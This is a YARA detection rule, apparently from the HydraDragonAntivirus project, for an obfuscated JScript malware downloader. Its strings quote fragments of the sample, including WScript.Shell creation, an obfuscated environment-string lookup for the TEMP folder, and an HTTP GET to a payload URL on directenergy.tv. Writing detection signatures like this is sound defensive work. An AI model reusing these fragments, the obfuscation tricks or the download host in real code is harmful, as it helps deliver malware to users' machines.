rule sig_20160427_8dad49c0f05cc7f0552ce3822c986418 {
  meta:
    description = "datamaliciousorder - file 20160427_8dad49c0f05cc7f0552ce3822c986418.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "02c9ebd8f8e531e0c5594ec00311a9ef3dbdeffa346bb92fbd41068f37b1abfb"

  strings:
    $s1  = "function QipjuKwlgf() {return XvafjThyor[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"8mUvCuR" ascii
    $s2  = "function QipjuKwlgf() {return XvafjThyor[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"8mUvCuR" ascii
    $s3  = "function AjojbZdzbb(DluejKrvms, SfikxMtnux){YlielLtydr = YlielLtydr * 1; return DluejKrvms - SfikxMtnux;};" fullword ascii
    $s4  = "var XvafjThyor = function EvfhnTtppf() {return PhmitPpilt[OlchwJwzdt](\"WScript\"+\".Shell\");}(), GydzqGczli = 11;" fullword ascii
    $s5  = "XuypoWyadq[ZodqjQuyjs](\"G\" + \"ET\", \"http://directenergy.tv/l2isd\", false);" fullword ascii
    $s6  = "var PhmitPpilt = this[\"WScript\"];" fullword ascii
    $s7  = "function AirysFpjsc(){return VmbhkJflhv + \"\";};" fullword ascii
    $s8  = "if (XuypoWyadq[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s9  = "function DnxchWzltr() {return ((DcecjYixlh == true) && (DcecjYixlh == YjfvvBkmgi)) ? 1 : YlielLtydr;};" fullword ascii
    $s10 = "var YjfvvBkmgi = false;" fullword ascii
    $s11 = "}while (PzsgoXmwgf);" fullword ascii
    $s12 = "var NmyovRgcbk = false;" fullword ascii
    $s13 = "function EdacdTxhoe(YamreRmjph) {var ErjtfYsied = (1, 2, 3, 4, 5, YamreRmjph); return ErjtfYsied;};" fullword ascii
    $s14 = "NmyovRgcbk = true;" fullword ascii
    $s15 = "var DcecjYixlh = false;" fullword ascii
    $s16 = "function DxrecOcsgj(){return 23;};" fullword ascii
    $s17 = "function FwtwjFvtkr()" fullword ascii
    $s18 = "return AjojbZdzbb(NgpxoLaaue, GtnoyBquwd);" fullword ascii
    $s19 = "DcecjYixlh = true; " fullword ascii
    $s20 = "var OfmpiOphog = new this[\"D\"+\"ate\"]();" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}